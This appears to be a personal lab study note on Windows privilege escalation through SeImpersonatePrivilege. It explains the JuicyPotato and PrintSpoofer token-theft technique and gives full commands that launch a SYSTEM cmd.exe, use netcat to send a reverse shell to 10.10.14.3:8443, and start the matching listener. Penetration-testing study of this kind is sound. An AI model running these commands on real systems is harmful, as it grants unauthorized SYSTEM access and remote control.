
The account for which we have access, has a dangerous privilege: `SeImpersonatePrivilege`.

```
whoami /priv

SeImpersonatePrivilege    Enabled
```

This privilege is a **golden ticket** for privesc.

Because it allows a low-priv process to **pretend to be** a SYSTEM-level process _if a SYSTEM process connects to it_.  
You can't become SYSTEM directly — but you can trick SYSTEM into talking to you.

This is what “Potato” exploits abuse.

---

####  Potato-style attacks (JuicyPotato, PrintSpoofer, RoguePotato)

These tools create a fake server that SYSTEM connects to.  
When SYSTEM connects, they steal the SYSTEM security token and start a new process as SYSTEM.

It’s token theft through impersonation.

### The chain:

1. You run JuicyPotato (or PrintSpoofer).
    
2. The tool forces a SYSTEM process to interact with your malicious COM server or named pipe.
    
3. SYSTEM connects → token captured.
    
4. Tool launches `cmd.exe` as SYSTEM.
    
5. You pipe that shell back to your machine using netcat.
    

That’s the whole exploit.

---

### How to exploit

Download JuicyPotato, JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

```shell-session

# In the target machine
# JuicyPotato, trick SYSTEM into giving us its token, then launch cmd.exe as SYSTEM, but make that cmd.exe run netcat to send us a reverse SYSTEM shell.

c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *


------

-l 53375: Tells JuicyPotato to open a **fake COM server** on port 53375
-p c:\windows\system32\cmd.exe: When SYSTEM token is stolen, launch **cmd.exe** with that token.

-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"
/c Means: run the following command and exit

c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe 
This runs **Netcat (nc.exe)** and tells it:
- connect back to your machine → `10.10.14.3` 
- on port → `8443`  
- when connected → `-e cmd.exe`  
    (bind SYSTEM shell to the connection)
    
-t *
Try both token creation methods:
- CreateProcessWithTokenW    
- CreateProcessAsUser
```

```shell-session
# From our machine to get a reverse shell

sudo nc -lnvp 8443
```

---

### Escalating Privileges using PrintSpoofer

```shell-session
# Target machine
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

# Attacker machine
nc -lnvp 8443


```

![[Pasted image 20251129133744.png]]